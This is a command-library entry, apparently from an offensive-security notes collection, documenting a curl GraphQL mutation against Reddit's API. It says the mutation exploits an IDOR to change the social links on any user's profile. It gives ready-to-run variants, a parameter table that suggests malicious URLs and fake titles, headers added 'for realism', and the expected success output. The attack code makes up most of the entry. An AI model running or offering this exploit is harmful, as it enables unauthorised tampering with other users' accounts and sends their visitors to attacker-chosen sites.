---
id: cmd-uuid-2
data: >-
  curl -X POST https://gql.reddit.com/ -H "Authorization: Bearer $TOKEN" -H
  "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0;
  Win64; x64; rv:102.0) Gecko/20000101 Firefox/101.0" -d
  '{"id":"c558e604581f","variables":{"input":{"socialLinks":[{"outboundUrl":"$NEW_URL","title":"$NEW_TITLE","type":"CUSTOM","id":"$LINK_ID"}]}}}'
tags:
  - graphql
  - modify
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2024-01-01T12:00:00Z'
updated_at: '2025-12-14T17:25:48.126Z'
verified: false
validated: true
submitted: true
---
# graphql-modify-reddit-social-link

## Command

```bash
curl -X POST https://gql.reddit.com/ -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20000101 Firefox/101.0" -d '{"id":"c558e604581f","variables":{"input":{"socialLinks":[{"outboundUrl":"$NEW_URL","title":"$NEW_TITLE","type":"CUSTOM","id":"$LINK_ID"}]}}}'
```

## Description

This curl command performs a GraphQL mutation to update a Reddit social link using its ID, allowing IDOR-based modifications to any user's profile.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $TOKEN | Reddit Bearer authentication token | Yes |
| $NEW_URL | New outbound URL (e.g., https://malicious-site.com) | Yes |
| $NEW_TITLE | New link title (e.g., Fake Link) | Yes |
| $LINK_ID | Extracted ID from fetch command | Yes |

## Examples

### Basic Usage

```bash
TOKEN="your_bearer_token" NEW_URL="https://hackerone.com" NEW_TITLE="hacker" LINK_ID="extracted_id" curl -X POST https://gql.reddit.com/ -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"id":"c558e604581f","variables":{"input":{"socialLinks":[{"outboundUrl":"$NEW_URL","title":"$NEW_TITLE","type":"CUSTOM","id":"$LINK_ID"}]}}}'
```

### Advanced Usage

Include additional headers for realism:

```bash
curl -X POST https://gql.reddit.com/ -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -H "Origin: https://www.reddit.com" -d '{"id":"c558e604581f","variables":{"input":{"socialLinks":[{"outboundUrl":"$NEW_URL","title":"$NEW_TITLE","type":"CUSTOM","id":"$LINK_ID"}]}}}'
```

## Expected Output

JSON response like {"data":{"updateSocialLinks":{"success":true}}} or similar confirmation without errors.

## Related

- [[commands/graphql-fetch-reddit-social-links]]
- [[procedures/Modify-Reddit-User-Social-Link-via-IDOR]]
